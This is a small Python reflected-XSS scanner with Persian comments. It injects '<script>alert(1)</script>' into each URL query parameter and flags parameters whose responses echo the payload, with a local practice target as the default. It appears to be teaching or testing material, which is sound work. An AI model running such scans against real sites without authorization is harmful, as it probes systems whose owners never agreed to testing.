import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

def scan_xss(url):
    # کد مخربی که قراره تزریق بشه
    payload = "<script>alert(1)</script>"
    
    # آدرس رو به بخش‌های مختلف (پارامترها) تقسیم می‌کنیم
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    
    if not query_params:
        print("[-] هیچ پارامتری در این آدرس پیدا نشد.")
        return

    for param in query_params:
        # یک نسخه جدید از آدرس می‌سازیم که جای پارامتر، کد مخرب ما هست
        new_params = {k: v[0] for k, v in query_params.items()}
        new_params[param] = payload
        new_query = urlencode(new_params)
        
        # آدرس جدید رو می‌سازیم
        new_parsed = parsed_url._replace(query=new_query)
        test_url = urlunparse(new_parsed)
        
        print(f"[*] Testing parameter: {param}")
        
        try:
            r = requests.get(test_url, timeout=5)
            # چک می‌کنیم ببینیم کد مخرب ما توی جواب سرور برگشته یا نه
            if payload in r.text:
                print(f"[+] XSS Found! (Vulnerable)")
                print(f"    URL: {test_url}")
            else:
                print(f"[-] Not vulnerable.")
        except Exception as e:
            print(f"[!] Error: {e}")

if __name__ == "__main__":
    # یه سایت تمرینی که مخصوص تست امنیت ساخته شده
    target_url = "http://127.0.0.1:8000/search.php?test=query"
    print(f"[*] Starting XSS scan on {target_url}")
    scan_xss(target_url)
    print("[*] Scan complete.")
